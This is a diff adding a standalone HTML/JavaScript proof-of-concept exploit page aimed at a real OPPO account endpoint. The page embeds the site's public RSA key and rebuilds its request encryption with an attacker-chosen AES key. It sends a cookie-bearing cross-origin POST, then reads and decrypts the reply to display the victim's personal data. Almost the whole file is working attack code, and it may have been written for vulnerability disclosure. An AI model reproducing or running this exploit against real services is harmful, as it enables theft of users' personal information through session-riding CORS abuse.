@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>OPPO CORS PoC - Full Data Exfil</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+</head>
+<body>
+  <h2>OPPO CORS PoC - Full Data Exfiltration</h2>
+  <p>Attacker Origin: <b id="origin"></b></p>
+
+  <label>Target URL:</label><br>
+  <input id="url" type="text" value="https://id-in.oppo.com/uc/web/v1/user-info/query-basic" size="70"><br><br>
+
+  <button onclick="exploit()">Exploit</button><br><br>
+
+  <textarea id="result" rows="25" cols="80" readonly></textarea>
+
+  <script>
+    document.getElementById('origin').textContent = window.location.origin;
+
+    // OPPO's hardcoded 1024-bit RSA public key (from url-params-preserver-45a4bf2d.js)
+    const OPPO_RSA_PUB = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDpgSW5VkZ6/xvh+wMXezrOokNdiupuvuMj4RVJy44byWDupl4H37z907A26RVdFzMeyLUQB4rsDIaXdxCODlljWW+/K96uF5MsDtOFUBw7VlOclIjcYTv/YDQEul8JoXoOuy1Yf3b5sbTpTuVTcl97tAuLJ8PoGe2K7N3B1eUQqQIDAQAB";
+
+    // Generate random alphanumeric string (same as OPPO's iv() function)
+    function randStr(n) {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      const buf = new Uint8Array(n);
+      crypto.getRandomValues(buf);
+      return Array.from(buf).map(b => chars[b % 62]).join('');
+    }
+
+    // RSA-OAEP encrypt using OPPO's public key (SHA-1, matches their importRsaPublicKey())
+    async function rsaEncrypt(plaintext) {
+      const der = Uint8Array.from(atob(OPPO_RSA_PUB), c => c.charCodeAt(0));
+      const key = await crypto.subtle.importKey(
+        'spki', der,
+        { name: 'RSA-OAEP', hash: 'SHA-1' },
+        false, ['encrypt']
+      );
+      const enc = new TextEncoder().encode(plaintext);
+      const buf = await crypto.subtle.encrypt({ name: 'RSA-OAEP' }, key, enc);
+      return btoa(String.fromCharCode(...new Uint8Array(buf)));
+    }
+
+    // Build the envelope: encKey.encIv.encBody  (matches OPPO's encryptRequestAsync())
+    async function buildPayload(bodyJson) {
+      const aesKey = randStr(16);
+      const aesIv  = randStr(16);
+
+      const encKey  = await rsaEncrypt(aesKey);
+      const encIv   = await rsaEncrypt(aesIv);
+      const encBody = CryptoJS.AES.encrypt(
+        CryptoJS.enc.Utf8.parse(bodyJson),
+        CryptoJS.enc.Utf8.parse(aesKey),
+        { mode: CryptoJS.mode.CBC, iv: CryptoJS.enc.Utf8.parse(aesIv), padding: CryptoJS.pad.Pkcs7 }
+      ).toString();
+
+      return { payload: encKey + '.' + encIv + '.' + encBody, aesKey, aesIv };
+    }
+
+    // AES-CBC decrypt the server's response (matches OPPO's aesDecrypt())
+    function aesDecrypt(ciphertext, aesKey, aesIv) {
+      const dec = CryptoJS.AES.decrypt(
+        ciphertext,
+        CryptoJS.enc.Utf8.parse(aesKey),
+        { mode: CryptoJS.mode.CBC, iv: CryptoJS.enc.Utf8.parse(aesIv), padding: CryptoJS.pad.Pkcs7 }
+      );
+      return dec.toString(CryptoJS.enc.Utf8);
+    }
+
+    async function exploit() {
+      const url = document.getElementById('url').value.trim();
+      const out = document.getElementById('result');
+      out.value = 'Target: ' + url + '\n';
+      out.value += 'Attacker origin: ' + window.location.origin + '\n\n';
+
+      out.value += 'Step 1: Generating ephemeral AES key + IV...\n';
+      const { payload, aesKey, aesIv } = await buildPayload('{}');
+      out.value += '  AES Key : ' + aesKey + '\n';
+      out.value += '  AES IV  : ' + aesIv + '\n\n';
+
+      out.value += 'Step 2: Sending encrypted credentialed POST request...\n';
+      out.value += '  (browser auto-attaches victim OPPO session cookies)\n\n';
+
+      try {
+        const res = await fetch(url, {
+          method: 'POST',
+          credentials: 'include',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-Envelope-Version': 'V1'
+          },
+          body: payload
+        });
+
+        out.value += 'Step 3: Response received!\n';
+        out.value += '  HTTP Status                      : ' + res.status + '\n';
+        out.value += '  Access-Control-Allow-Origin      : ' + res.headers.get('access-control-allow-origin') + '\n';
+        out.value += '  Access-Control-Allow-Credentials : ' + res.headers.get('access-control-allow-credentials') + '\n\n';
+
+        const rawBody = await res.text();
+        out.value += 'Step 4: Encrypted response body (readable by attacker JS):\n';
+        out.value += rawBody.substring(0, 300) + (rawBody.length > 300 ? '...' : '') + '\n\n';
+
+        out.value += 'Step 5: Decrypting with attacker-controlled AES key...\n';
+        try {
+          const plaintext = aesDecrypt(rawBody, aesKey, aesIv);
+          if (plaintext && plaintext.length > 0) {
+            out.value += '\n=== VICTIM DATA EXFILTRATED ===\n';
+            out.value += plaintext + '\n';
+            out.value += '================================\n\n';
+            out.value += '[SUCCESS] CORS + Encryption bypass confirmed. Victim PII exposed!';
+          } else {
+            out.value += 'Decryption returned empty.\n';
+            out.value += 'The server may require valid signing headers (X-Euler-Const) for a data response.\n\n';
+            out.value += '[CORS CONFIRMED] Response was readable. Raw body above is proof of CORS misconfiguration.';
+          }
+        } catch (e) {
+          out.value += 'Decryption error: ' + e.message + '\n';
+          out.value += '[CORS CONFIRMED] Response body was readable by attacker JS (see raw body above).';
+        }
+
+      } catch (e) {
+        out.value += 'ERROR: ' + e.message + '\n';
+        out.value += '[CORS BLOCKED] Browser prevented reading the response.';
+      }
+    }
+  </script>
+</body>
+</html>
